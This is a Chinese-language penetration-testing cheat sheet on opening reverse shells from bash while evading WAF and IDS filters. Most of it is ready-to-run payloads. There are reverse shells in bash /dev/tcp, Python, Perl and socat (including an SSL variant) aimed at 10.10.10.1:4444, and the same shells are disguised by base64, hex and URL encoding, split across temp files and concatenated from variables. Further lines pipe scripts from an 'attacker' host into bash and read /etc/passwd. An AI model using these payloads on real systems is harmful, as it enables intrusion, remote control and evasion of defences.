# 反弹shell绕过WAF技巧

## 概述

反弹shell是渗透测试中获取远程shell的关键技术。当目标存在WAF/IDS时，需要使用各种绕过技巧。本文详细介绍bash环境下反弹shell的WAF绕过方法。

## 核心理念

- **编码绕过**：对敏感关键字进行编码
- **分段传输**：将payload拆分为多个部分
- **变量拼接**：使用变量拼接绕过关键字检测
- **无回显Shell**：使用无回显方式建立连接

---

## 1. 关键字过滤绕过

### 1.1 空格绕过

```bash
# 使用 $IFS 替代空格
cat${IFS}/etc/passwd
cat$IFS/etc/passwd

# 使用 {command,arg} 语法
{cat,/etc/passwd}

# 使用 %09 (tab)
cat%09/etc/passwd

# 使用 <> 重定向
cat<>/etc/passwd

# 使用 %20
cat%20/etc/passwd
```

### 1.2 关键字拆分

```bash
# 分割反弹shell命令
# bash -i >& /dev/tcp/IP/PORT 0>&1

# 方法1: 使用变量
a=bas; b=h; c=" -i"; $a$b$c

# 方法2: 使用反引号
`echo YmFzaA== | base64 -d` -i >& /dev/tcp/IP/PORT 0>&1

# 方法3: 使用 $()
$(echo YmFzaA== | base64 -d) -i >& /dev/tcp/IP/PORT 0>&1

# 方法4: 字符串拼接
bash${IFS}-i${IFS}>&${IFS}/dev/tcp/${ip}/${port}>&1
```

### 1.3 特殊字符替换

```bash
# 使用 /bin/sh 替代 /bin/bash
sh${IFS}-i${IFS}>&${IFS}/dev/tcp/${ip}/${port}>&1

# 使用 /usr/bin/python
python${IFS}-c${IFS}'import socket,subprocess,os;s=socket.socket();s.connect(("IP",PORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

---

## 2. 编码绕过

### 2.1 Base64 编码绕过

```bash
# 编码反弹shell
payload="bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"
encoded=$(echo -n "$payload" | base64)
echo "$encoded" | base64 -d | bash

# 多层编码
double_encoded=$(echo -n "$encoded" | base64)
echo "$double_encoded" | base64 -d | base64 -d | bash

# 使用 eval 执行
eval "$(echo "$encoded" | base64 -d)"
```

### 2.2 Hex 编码绕过

```bash
# 编码反弹shell
payload="bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"
hex_encoded=$(echo -n "$payload" | xxd -p | tr -d '\n')
echo "$hex_encoded" | xxd -r -p | bash

# 使用 printf 执行
printf "$(echo "$hex_encoded" | sed 's/../\\x&/g')" | bash
```

### 2.3 URL 编码绕过

```bash
# 使用 curl 发送编码payload
curl -s -d "cmd=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"))')" http://target/api

# 在URL中使用编码
encoded=$(python3 -c 'import urllib.parse; print(urllib.parse.quote("bash -i >& /dev/tcp/10.10.10.1/4444 0>&1"))')
curl "http://target/?cmd=${encoded}"
```

---

## 3. 分段传输

### 3.1 管道分段

```bash
# 分段构建payload
echo "bash -i " > /tmp/p1
echo ">& /dev/tcp/" > /tmp/p2
echo "10.10.10.1/" > /tmp/p3
echo "4444 " > /tmp/p4
echo "0>&1" > /tmp/p5

cat /tmp/p1 /tmp/p2 /tmp/p3 /tmp/p4 /tmp/p5 | bash

# 清理
rm -f /tmp/p{1,2,3,4,5}
```

### 3.2 文件分段

```bash
# 使用 echo 追加写入
echo -n "bash" > /tmp/.payload
echo -n " -i " >> /tmp/.payload
echo -n ">& /dev/tcp/" >> /tmp/.payload
echo -n "10.10.10.1/" >> /tmp/.payload
echo -n "4444" >> /tmp/.payload
echo -n " 0>&1" >> /tmp/.payload

bash /tmp/.payload
rm -f /tmp/.payload
```

### 3.3 网络分段接收

```bash
# 在攻击机上分段发送
# 终端1: 分段发送
echo -n "bash" | nc target 80
sleep 1
echo -n " -i " | nc target 80
sleep 1
echo -n ">& /dev/tcp/" | nc target 80
sleep 1
echo -n "10.10.10.1/4444" | nc target 80
sleep 1
echo -n " 0>&1" | nc target 80
```

---

## 4. 变量拼接

### 4.1 环境变量拼接

```bash
# 使用环境变量
export A="bas"
export B="h -i"
export C=">& /dev/tcp/"
export D="10.10.10.1/4444"
export E=" 0>&1"
${A}${B}${C}${D}${E}
```

### 4.2 字符串拼接

```bash
# 使用字符串拼接
a="bash"
b=" -i"
c=" >& "
d="/dev/tcp/"
e="10.10.10.1/4444"
f=" 0>&1"
$a$b$c$d$e$f
```

### 4.3 数组拼接

```bash
# 使用数组
arr=("bash" "-i" ">&" "/dev/tcp/10.10.10.1/4444" "0>&1")
"${arr[@]}"
```

---

## 5. 无回显Shell

### 5.1 使用文件传输

```bash
# 下载并执行
curl -s http://attacker/shell.sh | bash
wget -qO- http://attacker/shell.sh | bash

# 使用 netcat 传输
nc attacker 80 | bash
```

### 5.2 使用 Perl/Python

```bash
# Perl 反弹shell
perl -e 'use Socket;$i="10.10.10.1";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'

# Python 反弹shell
python -c 'import socket,subprocess,os;s=socket.socket();s.connect(("10.10.10.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```

### 5.3 使用 Socat

```bash
# 加密反弹shell
socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.10.10.1:4444

# SSL 加密
socat OPENSSL:10.10.10.1:4444,verify=0 EXEC:'bash -li',pty,stderr,setsid,sigint,sane
```

---

## 6. 综合绕过脚本

```bash
#!/usr/bin/env bash
# 综合反弹shell绕过脚本

IP="10.10.10.1"
PORT=4444

# 编码payload
payload="bash -i >& /dev/tcp/${IP}/${PORT} 0>&1"
encoded=$(echo -n "$payload" | base64)

# 使用eval执行
eval "$(echo "$encoded" | base64 -d)"

# 或使用管道
echo "$encoded" | base64 -d | bash
```

---

## 总结

本文介绍了bash反弹shell绕过WAF的多种技术：关键字过滤绕过、编码绕过、分段传输、变量拼接和无回显Shell。这些技术可用于渗透测试中的shell获取。
